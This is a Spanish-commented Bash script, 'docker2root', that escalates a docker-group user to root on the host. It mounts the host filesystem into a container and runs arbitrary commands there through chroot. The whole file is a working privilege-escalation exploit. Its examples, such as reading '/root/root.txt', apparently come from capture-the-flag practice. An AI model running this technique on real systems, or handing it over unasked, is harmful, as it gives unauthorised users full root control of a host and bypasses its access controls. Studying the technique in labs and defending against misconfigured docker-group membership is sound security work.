#!/bin/bash

# =========================================================
# docker2root
# Autor: Carlos Martín
# =========================================================
#
# Descripción:
# Herramienta que permite ejecutar comandos sobre el host
# mediante Docker si el usuario
# pertenece al grupo docker, y ejecutarlos como root en ciertas 
# condiciones.
#
# Uso:
#   chmod +x docker2root
#   ./docker2root <comando>
#
# Ejemplos:
#   ./docker2root id
#   ./docker2root whoami
#   ./docker2root ls /root
#   ./docker2root cat /root/root.txt
#
# =========================================================

echo "[+] docker2root"
echo

# ---------------------------------------------------------
# Comprobar Docker
# ---------------------------------------------------------

echo "[+] Comprobando si Docker está instalado..."

command -v docker >/dev/null 2>&1

if [ $? -ne 0 ]; then
    echo "[-] Docker no está instalado."
    exit 1
fi

echo "[+] Docker encontrado."
echo

# ---------------------------------------------------------
# Comprobar grupo docker
# ---------------------------------------------------------

echo "[+] Comprobando pertenencia al grupo docker..."

id | grep -q docker

if [ $? -ne 0 ]; then
    echo "[-] El usuario actual NO pertenece al grupo docker."
    exit 1
fi

echo "[+] El usuario pertenece al grupo docker."
echo

# ---------------------------------------------------------
# Comprobar acceso al daemon
# ---------------------------------------------------------

echo "[+] Comprobando acceso al daemon Docker..."

docker ps >/dev/null 2>&1

if [ $? -ne 0 ]; then
    echo "[-] No se puede acceder al daemon Docker."
    exit 1
fi

echo "[+] Acceso al daemon Docker confirmado."
echo

# ---------------------------------------------------------
# Comprobar comando
# ---------------------------------------------------------

if [ $# -eq 0 ]; then
    echo "[-] Debes indicar un comando."
    echo
    echo "Uso:"
    echo "    $0 <comando>"
    echo
    echo "Ejemplos:"
    echo "    $0 id"
    echo "    $0 ls /root"
    echo "    $0 cat /root/root.txt"
    exit 1
fi

# ---------------------------------------------------------
# Buscar imagen usable
# ---------------------------------------------------------

echo "[+] Buscando imagen Docker usable..."

if docker image inspect alpine >/dev/null 2>&1; then
    IMAGE="alpine"
    echo "[+] Imagen alpine encontrada localmente."

elif docker pull alpine >/dev/null 2>&1; then
    IMAGE="alpine"
    echo "[+] Imagen alpine descargada correctamente."

else
    echo "[!] No se pudo usar alpine."
    echo "[+] Buscando imágenes locales..."

    IMAGE=$(docker images --format "{{.Repository}}:{{.Tag}}" | grep -v "<none>" | head -n 1)

    if [ -z "$IMAGE" ]; then
        echo "[-] No se encontraron imágenes locales."
        exit 1
    fi

    echo "[+] Imagen local encontrada: $IMAGE"
fi

echo

# ---------------------------------------------------------
# Comprobar chroot
# ---------------------------------------------------------

echo "[+] Comprobando si chroot funciona..."

docker run --rm -v /:/mnt "$IMAGE" chroot /mnt id >/dev/null 2>&1

if [ $? -eq 0 ]; then
    echo "[+] chroot funcional."
    echo "[+] Ejecutando comando como root sobre el host:"
    echo "    $*"
    echo

    docker run --rm -v /:/mnt "$IMAGE" chroot /mnt "$@"

else
    echo "[!] chroot no funciona."
    echo "[+] Ejecutando comando desde el contenedor con el host montado en /mnt:"
    echo "    $*"
    echo

    docker run --rm -v /:/mnt "$IMAGE" "$@"
fi
